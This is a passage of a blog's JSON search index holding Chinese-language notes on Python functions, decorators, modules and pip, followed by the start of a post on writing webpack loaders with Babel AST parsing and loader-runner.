比较数据</li>\n<li><code>int</code>: 可以把其他数据类型转换为整数</li>\n<li><code>float</code>: 转成浮点数</li>\n<li><code>str</code>: 转成字符型</li>\n<li><code>bool</code>: 转成boolean类型</li>\n<li><code>hex</code>: 转成十六进制</li>\n</ul>\n<p>通过<code>lambda</code>来定义匿名函数<br>匿名函数<code>lambda x: x * x</code>实际上就是：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def f(x):</span><br><span class=\"line\">    return x * x</span><br></pre></td></tr></table></figure>\n<h2 id=\"定义函数\"><a href=\"#定义函数\" class=\"headerlink\" title=\"定义函数\"></a>定义函数</h2><ul>\n<li>通过<code>def</code>关键词来声明函数</li>\n<li>括号内的<code>x</code>是相应的参数</li>\n<li>没有定义return值，默认返回<code>None</code></li>\n<li>返回的多个值，将会变成tuple</li>\n<li><code>python</code>中函数与变量之间也存在闭包，返回函数通过对外层函数变量的引用也会导致变量闭包，与JavaScript中的闭包非常类似，不过里层变量在使用外层作用域变量时需要使用<code>nonlocal</code>对变量进行申明</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def my_abs(x):</span><br><span class=\"line\">    if x &gt;= 0:</span><br><span class=\"line\">        return x</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        return -x</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>定义空函数</p>\n</blockquote>\n<p>使用<code>pass</code>语句，若函数、条件判断不使用pass关键词又为空的会将会报错</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def nop():</span><br><span class=\"line\">    pass</span><br></pre></td></tr></table></figure>\n<h2 id=\"函数的参数\"><a href=\"#函数的参数\" class=\"headerlink\" title=\"函数的参数\"></a>函数的参数</h2><ul>\n<li>默认情况下不校验参数类型，内置函数会校验参数类型</li>\n<li>会校验参数个数</li>\n<li>可以给参数定义默认值<ul>\n<li>必选参数在前，默认参数在后</li>\n<li>提供了默认参数，在调用函数时默认参数不传</li>\n<li>默认参数必须指向不变对象！(可变对象对此调用函数后将会导致值更改值被缓存下来了)</li>\n</ul>\n</li>\n</ul>\n<blockquote>\n<p>可变参数，参数传入的数量可以是不定的，通过<code>*</code>关键词可以将传入的参数变成元组,可以不传参</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def calc(*numbers):</span><br><span class=\"line\">    print(numbers)</span><br><span class=\"line\">calc(1,2,3,4)</span><br><span class=\"line\"># 运行输出</span><br><span class=\"line\">calc(1,2,3,4)</span><br><span class=\"line\">(1,2,3,4)</span><br><span class=\"line\"></span><br><span class=\"line\"># calc(*numbers) === calc((1,2,3,4))</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>可以将list或tuple的元素变成可变参数传进去，相当于数组解构展开</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nums = [1, 2, 3]</span><br><span class=\"line\">calc(*nums)</span><br><span class=\"line\">(1,2,3)</span><br><span class=\"line\"></span><br><span class=\"line\"># calc(*nums) === calc(1,2,3)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>关键字参数允许你传入0个或任意个含参数名的参数，这些关键字参数在函数内部自动组装为一个dict</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def person(name, age, **kw):</span><br><span class=\"line\">    print(&apos;name:&apos;, name, &apos;age:&apos;, age, &apos;other:&apos;, kw)</span><br><span class=\"line\">person(&apos;Bob&apos;, 35, city=&apos;Beijing&apos;,job=&apos;Engineer&apos;)</span><br><span class=\"line\">(&apos;name:&apos;, &apos;Bob&apos;, &apos;age:&apos;, 35, &apos;other:&apos;, &#123;&apos;city&apos;: &apos;Beijing&apos;, &apos;job&apos;: &apos;Engineer&apos;&#125;)</span><br></pre></td></tr></table></figure>\n<p>简化的写法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">extra = &#123;&apos;city&apos;: &apos;Beijing&apos;, &apos;job&apos;: &apos;Engineer&apos;&#125;</span><br><span class=\"line\">person(&apos;Jack&apos;, 24, **extra)</span><br><span class=\"line\">name: Jack age: 24 other: &#123;&apos;city&apos;: &apos;Beijing&apos;, &apos;job&apos;: &apos;Engineer&apos;&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>命名关键字参数必须传入参数名</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def person(name, age, *, city=&apos;Beijing&apos;, job):</span><br><span class=\"line\">    print(name, age, city, job)</span><br><span class=\"line\">person(&apos;Jack&apos;, 24, job=&apos;Engineer&apos;)</span><br><span class=\"line\">Jack 24 Beijing Engineer</span><br></pre></td></tr></table></figure>\n<h3 id=\"函数式编程\"><a href=\"#函数式编程\" class=\"headerlink\" title=\"函数式编程\"></a>函数式编程</h3><blockquote>\n<p>map</p>\n</blockquote>\n<ul>\n<li><code>map</code>接收两个参数，第一个是<code>Iterable</code>的函数，第二个是需要迭代的list、或set数据<ul>\n<li><code>Iterable</code>迭代的参数将会接收到两个参数：第一个参数是前一个，第二个参数是后一个</li>\n<li>map返回的是一个新的list</li>\n</ul>\n</li>\n<li>list所有元素*10</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def f(x):</span><br><span class=\"line\">    return x * x</span><br><span class=\"line\">r = map(f, [1, 2, 3, 4, 5, 6, 7, 8, 9])</span><br><span class=\"line\">list(r)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>reduce</p>\n</blockquote>\n<p>reduce把结果继续和序列的下一个元素做累积计算，其效果就是:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">reduce(f, [x1, x2, x3, x4]) = f(f(f(x1, x2), x3), x4)</span><br></pre></td></tr></table></figure>\n<p>例如序列求和:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from functools import reduce</span><br><span class=\"line\">def add(x, y):</span><br><span class=\"line\">    return x + y</span><br><span class=\"line\"></span><br><span class=\"line\">reduce(add, [1, 3, 5, 7, 9])</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>filter</p>\n</blockquote>\n<p><code>filter()</code>函数用于过滤序列,和<code>map()</code>类似，<code>filter()</code>也接收一个函数和一个序列。和<code>map()</code>不同的是，<code>filter()</code>把传入的函数依次作用于每个元素，然后根据返回值是<code>True</code>还是<code>False</code>决定保留还是丢弃该元素。</p>\n<p>例如删掉偶数，只保留奇数：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def is_odd(n):</span><br><span class=\"line\">    return n % 2 == 1</span><br><span class=\"line\"></span><br><span class=\"line\">list(filter(is_odd, [1, 2, 4, 5, 6, 9, 10, 15]))</span><br><span class=\"line\"># 结果: [1, 5, 9, 15]</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>sorted</p>\n</blockquote>\n<p>排序也是在程序中经常用到的算法。无论使用冒泡排序还是快速排序，排序的核心是比较两个元素的大小。如果是数字，我们可以直接比较，但如果是字符串或者两个dict呢？直接比较数学上的大小是没有意义的，因此，比较的过程必须通过函数抽象出来。</p>\n<ul>\n<li><code>sorted()</code>函数也是一个高阶函数，<ul>\n<li>还可以接收一个key函数来实现自定义的排序，例如: <ul>\n<li>按绝对值大小排序<br><code>sorted([36, 5, -12, 9, -21], key=abs)</code></li>\n</ul>\n</li>\n</ul>\n</li>\n<li>默认情况下，对字符串排序，是按照ASCII的大小比较的</li>\n<li>忽略大小写<ul>\n<li><code>sorted([&#39;bob&#39;, &#39;about&#39;, &#39;Zoo&#39;, &#39;Credit&#39;], key=str.lower)</code></li>\n</ul>\n</li>\n<li>反向排序，传入<code>reverse=True</code></li>\n</ul>\n<h3 id=\"装饰器\"><a href=\"#装饰器\" class=\"headerlink\" title=\"装饰器\"></a>装饰器</h3><blockquote>\n<p>假设我们要增强一个函数的功能，比如，在函数调用前后自动打印日志，但又不希望修改这个函数的定义，这种在代码运行期间动态增加功能的方式，称之为“装饰器”（<code>Decorator</code>）</p>\n</blockquote>\n<p>decorator就是一个返回函数的高阶函数。所以，我们要定义一个能打印日志的decorator，可以定义如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def log(func):</span><br><span class=\"line\">    def wrapper(*args, **kw):</span><br><span class=\"line\">        print(&apos;call %s():&apos; % func.__name__)</span><br><span class=\"line\">        return func(*args, **kw)</span><br><span class=\"line\">    return wrapper</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>使用装饰器</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@log</span><br><span class=\"line\">def now():</span><br><span class=\"line\">    print(&apos;2015-3-25&apos;)</span><br></pre></td></tr></table></figure>\n<p>把@log放到now()函数的定义处，相当于执行了语句：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">now = log(now)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>函数拥有<code>__name__</code>属性，通过这个属性可以查看到函数的名称</li>\n</ul>\n<blockquote>\n<p>decorator本身需要传入参数，那就需要编写一个返回decorator的高阶函数</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def log(text):</span><br><span class=\"line\">    def decorator(func):</span><br><span class=\"line\">        def wrapper(*args, **kw):</span><br><span class=\"line\">            print(&apos;%s %s():&apos; % (text, func.__name__))</span><br><span class=\"line\">            return func(*args, **kw)</span><br><span class=\"line\">        return wrapper</span><br><span class=\"line\">    return decorator</span><br></pre></td></tr></table></figure>\n<p>decorator用法如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@log(&apos;execute&apos;)</span><br><span class=\"line\">def now():</span><br><span class=\"line\">    print(&apos;2015-3-25&apos;)</span><br></pre></td></tr></table></figure>\n<p>携带参数的装饰器是这样的:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">now = log(&apos;execute&apos;)(now)</span><br></pre></td></tr></table></figure>\n<p>但是通过自定义装饰器的包装，<code>__name__</code>属性的值已经变成了<code>wrapper</code>,Python内置的<code>functools.wraps</code>就是用来解决这个问题的。</p>\n<p>参数的decorator:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import functools</span><br><span class=\"line\"></span><br><span class=\"line\">def log(text):</span><br><span class=\"line\">    def decorator(func):</span><br><span class=\"line\">        @functools.wraps(func)</span><br><span class=\"line\">        def wrapper(*args, **kw):</span><br><span class=\"line\">            tprint(&apos;%s %s():&apos; % (text, func.__name__))</span><br><span class=\"line\">            return func(*args, **kw)</span><br><span class=\"line\">        return wrapper</span><br><span class=\"line\">    return decorator</span><br></pre></td></tr></table></figure>\n<h3 id=\"偏函数\"><a href=\"#偏函数\" class=\"headerlink\" title=\"偏函数\"></a>偏函数</h3><p>偏函数在Python中的定义是：把一个函数的某些参数给固定住（也就是设置默认值），返回一个新的函数，调用这个新函数会更简单</p>\n<p>可以通过<code>functools.partial</code>创建偏函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int2 = functools.partial(int, base=2)</span><br></pre></td></tr></table></figure>\n<h2 id=\"迭代\"><a href=\"#迭代\" class=\"headerlink\" title=\"迭代\"></a>迭代</h2><p>在Python中，迭代是通过<code>for ... in</code>来完成的</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">d = &#123;&apos;a&apos;: 1, &apos;b&apos;: 2, &apos;c&apos;: 3&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>迭代dict</p>\n</blockquote>\n<p><code>dict</code>迭代的是<code>key</code>。如果要迭代<code>value</code>，可以用<code>for value in d.values()</code>，如果要同时迭代<code>key</code>和<code>value</code>，可以用<code>for k, v in d.items()</code>。</p>\n<blockquote>\n<p>判断对象是否是可迭代项目</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from collections import Iterable</span><br><span class=\"line\">isinstance(&apos;abc&apos;, Iterable) # str是否可迭代</span><br><span class=\"line\">True</span><br></pre></td></tr></table></figure>\n<h2 id=\"模块\"><a href=\"#模块\" class=\"headerlink\" title=\"模块\"></a>模块</h2><p>模块内容组成，以下面代码为例:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python3</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"></span><br><span class=\"line\">&apos; a test module &apos;</span><br><span class=\"line\"></span><br><span class=\"line\">__author__ = &apos;Michael Liao&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">import sys</span><br><span class=\"line\"></span><br><span class=\"line\">def test():</span><br><span class=\"line\">    print(&apos;hello!&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__==&apos;__main__&apos;:</span><br><span class=\"line\">    test()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>第1行注释可以让这个<code>*.py</code>文件直接在<code>Unix/Linux/Mac</code>上运行</li>\n<li>第2行注释表示<code>.py</code>文件本身使用标准UTF-8编码</li>\n<li>第4行是一个字符串，表示模块的文档注释，任何模块代码的第一个字符串都被视为模块的文档注释</li>\n<li>第6行使用<code>__author__</code>变量把作者写进去</li>\n</ul>\n<blockquote>\n<p>导入模块</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import sys</span><br></pre></td></tr></table></figure>\n<p>导入<code>sys</code>模块后，我们就有了变量<code>sys</code>指向该模块，利用<code>sys</code>这个变量，就可以访问<code>sys</code>模块的所有功能</p>\n<ul>\n<li><code>sys</code>模块有一个<code>argv</code>变量，用<code>list</code>存储了命令行的所有参数<ul>\n<li>运行<code>python3 hello.py Michael</code>获得的<code>sys.argv</code>就是<code>[&#39;hello.py&#39;, &#39;Michael]</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"作用域\"><a href=\"#作用域\" class=\"headerlink\" title=\"作用域\"></a>作用域</h3><p>模块内的私有变量和函数我们通过<code>_</code>来实现，类似<code>_xxx</code>和<code>__xxx</code>这样的函数或变量就是非公开的（<code>private</code>），不应该被直接引用，比如<code>_abc</code>，<code>__abc</code>等</p>\n<p>private函数和变量“不应该”被直接引用，而不是“不能”被直接引用，是因为Python并没有一种方法可以完全限制访问private函数或变量，但是，从编程习惯上不应该引用private函数或变量。</p>\n<h3 id=\"安装python包\"><a href=\"#安装python包\" class=\"headerlink\" title=\"安装python包\"></a>安装python包</h3><p>一般来说，第三方库都会在Python官方的pypi.python.org网站注册，要安装一个第三方库，必须先知道该库的名称，可以在官网或者pypi上搜索，比如Pillow的名称叫Pillow，因此，安装Pillow的命令就是：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pip install Pillow</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>模块搜索路径</p>\n</blockquote>\n<p>当我们试图加载一个模块时，Python会在指定的路径下搜索对应的.py文件，如果找不到，就会报错</p>\n<p>默认情况下，Python解释器会搜索当前目录、所有已安装的内置模块和第三方模块，搜索路径存放在sys模块的path变量中:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import sys</span><br><span class=\"line\">sys.path</span><br><span class=\"line\">[&apos;&apos;, &apos;/Library/Frameworks/Python.framework/Versions/3.6/lib/python36.zip&apos;, &apos;/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6&apos;, ..., &apos;/Library/Frameworks/Python.framework/Versions/3.6/lib/python3.6/site-packages&apos;]</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>添加自己的搜索目录</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import sys</span><br><span class=\"line\">sys.path.append(&apos;/Users/michael/my_py_scripts&apos;)</span><br></pre></td></tr></table></figure>\n<h2 id=\"安装版本\"><a href=\"#安装版本\" class=\"headerlink\" title=\"安装版本\"></a>安装版本</h2><blockquote>\n<p>问题</p>\n</blockquote>\n<p>如电脑上同时装了python2(2.7)和python3(3.5)，当使用pip安装时默认应安装到python2中，pip3安装时应安装到python3中，但奇怪的是使用pip安装时每次都定位到python3中，不知是啥原因，也不知如何将其重定向到python2中，索性手动指定pip到python2中</p>\n<blockquote>\n<p>查看pip版本</p>\n</blockquote>\n<p>pip -V pip 18.0 from /usr/local/lib/python3.5/dist-packages/pip (python 3.5)<br>pip2 -V pip 8.1.1 from /usr/lib/python2.7/dist-packages (python 2.7)<br>pip3 -V pip 18.0 from /usr/local/lib/python3.5/dist-packages/pip (python 3.5)</p>\n<blockquote>\n<p>pip指定python版本安装</p>\n</blockquote>\n<p>安装到python2.7版本中：sudo pip2 install 模块名 或 python2 -m pip install 模块名<br>安装到python3.5版本中：sudo pip3 install 模块名 或 python3 -m pip install 模块名</p>\n","categories":["python"],"tags":["python"]},{"title":"loader入门","url":"http://zhoushaw.github.io/2019/07/29/learning/font-end/js/loader/","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>Loader 就像是一个翻译员，能把源文件经过转化后输出新的结果，并且一个文件还可以链式的经过多个翻译员翻译。</p>\n<p>可以通过loader对源码进行解析编译，生成新的代码，例如babel-loader，就是对源码进行编译解析将es6转换成es5代码</p>\n<blockquote>\n<p>Loader 基础</p>\n</blockquote>\n<p>由于 Webpack 是运行在 Node.js 之上的，一个 Loader 其实就是一个 Node.js 模块，这个模块需要导出一个函数。 这个导出的函数的工作就是获得处理前的原内容，对原内容执行处理后，返回处理后的内容。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">module.exports = function(source) &#123;</span><br><span class=\"line\">  // source 为 compiler 传递给 Loader 的一个文件的原内容</span><br><span class=\"line\">  // 该函数需要返回处理后的内容，这里简单起见，直接把原内容返回了，相当于该 Loader 没有做任何转换</span><br><span class=\"line\">  return source;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"关于学习AST转换的一些文档\"><a href=\"#关于学习AST转换的一些文档\" class=\"headerlink\" title=\"关于学习AST转换的一些文档\"></a>关于学习AST转换的一些文档</h2><ul>\n<li><a href=\"https://github.com/jamiebuilds/babel-handbook/blob/master/translations/en/user-handbook.md\" target=\"_blank\" rel=\"noopener\">babel-handbook</a></li>\n<li><a href=\"https://babeljs.io/docs/en/babel-types#functionexpression\" target=\"_blank\" rel=\"noopener\">babel-types</a></li>\n<li><a href=\"https://astexplorer.net/\" target=\"_blank\" rel=\"noopener\">ast-explorer</a></li>\n<li><a href=\"https://github.com/jamiebuilds/babel-handbook/blob/master/translations/en/plugin-handbook.md\" target=\"_blank\" rel=\"noopener\">Babylon-AST初探-代码生成</a></li>\n</ul>\n<h2 id=\"Babel-的处理步骤\"><a href=\"#Babel-的处理步骤\" class=\"headerlink\" title=\"Babel 的处理步骤\"></a>Babel 的处理步骤</h2><p>Babel 的三个主要处理步骤分别是：</p>\n<ul>\n<li><code>解析（parse）</code></li>\n<li><code>转换（transform）</code></li>\n<li><code>生成（generate）</code></li>\n</ul>\n<blockquote>\n<p>解析</p>\n</blockquote>\n<p>解析步骤接收代码并输出 AST。 这个步骤分为两个阶段：<strong>词法分析（Lexical Analysis） </strong>和 语法分析（Syntactic Analysis）。</p>\n<blockquote>\n<p>转换</p>\n</blockquote>\n<p>转换步骤接收 AST 并对其进行遍历，在此过程中对节点进行添加、更新及移除等操作</p>\n<blockquote>\n<p>生成</p>\n</blockquote>\n<p>代码生成步骤把最终（经过一系列转换之后）的 AST 转换成字符串形式的代码，同时还会创建源码映射（source maps）</p>\n<h3 id=\"解析\"><a href=\"#解析\" class=\"headerlink\" title=\"解析\"></a>解析</h3><p>在进行代码转换前，需要将代码转换成AST语法，可以通过<code>babel</code>提供的<code>parser</code>工具进行转换，具体转换成ast代码如下：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 安装依赖 npm install @babel/parser</span><br><span class=\"line\">const parser = require(&quot;@babel/parser&quot;);</span><br><span class=\"line\">// 其中code为提供的源码</span><br><span class=\"line\">let code = `</span><br><span class=\"line\">    function testFn() &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">`;</span><br><span class=\"line\">const ast = parser.parse(code);</span><br></pre></td></tr></table></figure>\n<h2 id=\"转换\"><a href=\"#转换\" class=\"headerlink\" title=\"转换\"></a>转换</h2><blockquote>\n<p>遍历</p>\n</blockquote>\n<p>要进行代码转换必须对AST进行遍历，它遍历的顺序是按照<strong>树的深度遍历</strong>进行</p>\n<p><img src=\"https://s10.mogucdn.com/mlcdn/c45406/190821_1736cgd1g5khfa8a4dfj11k7cebf7_440x376.png\" alt=\"\"></p>\n<p>详细遍历过程可参考：<a href=\"https://github.com/jamiebuilds/babel-handbook/blob/master/translations/zh-Hans/plugin-handbook.md#%E9%81%8D%E5%8E%86\" target=\"_blank\" rel=\"noopener\">traverse遍历规则</a></p>\n<blockquote>\n<p>如何通过babel访问并修改ast节点</p>\n</blockquote>\n<p>我们可以通过<code>@babel/parser</code>npm包对ast进行访问，具体实现代码如下:</p>\n<h2 id=\"从零开发一个loader\"><a href=\"#从零开发一个loader\" class=\"headerlink\" title=\"从零开发一个loader\"></a>从零开发一个loader</h2><p>###利用 loader-runner 调试 Loaders</p>\n<p><a href=\"https://www.npmjs.com/package/loader-runner\" target=\"_blank\" rel=\"noopener\">loader-runner</a> 允许你不依靠 webpack 单独运行 loader</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir loader-example &amp;&amp; cd $_</span><br><span class=\"line\">touch index.js  // 创建需要转换的数据源</span><br><span class=\"line\">npm init</span><br><span class=\"line\">npm install loader-runner --save-dev</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>创建运行loader文件</p>\n</blockquote>\n<ul>\n<li>step1</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">touch run-loader.js</span><br></pre></td></tr></table></figure>\n<ul>\n<li>step2</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//run-loader.js</span><br><span class=\"line\">const fs = require(&quot;fs&quot;);</span><br><span class=\"line\">const path = require(&quot;path&quot;);</span><br><span class=\"line\">const &#123; runLoaders &#125; = require(&quot;loader-runner&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">runLoaders(</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    resource: &quot;./index.js&quot;, // 转换源</span><br><span class=\"line\">    loaders: [path.resolve(__dirname, &quot;./loader-demo.js&quot;)], // loader地址</span><br><span class=\"line\">    readResource: fs.readFile.bind(fs),</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  // 第二个参数，是一个函数形参是错误、转换结果</span><br><span class=\"line\">  (err, result) =&gt; &#123;</span><br><span class=\"line\">    if (err) &#123;</span><br><span class=\"line\">        console.error(err)</span><br><span class=\"line\">        return;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    //输出转换结果到output.js中</span><br><span class=\"line\">    fs.writeFileSync(&quot;./output.js&quot;, result.result)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>创建loader</p>\n</blockquote>\n<ul>\n<li>step1</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">touch loader-demo.js</span><br></pre></td></tr></table></figure>\n<ul>\n<li>step2</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">module.exports = function(source) &#123;</span><br><span class=\"line\">  // ... 对source进行转换</span><br><span class=\"line\">  return source;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"通过AST对代码进行改造\"><a href=\"#通过AST对代码进行改造\" class=\"headerlink\" 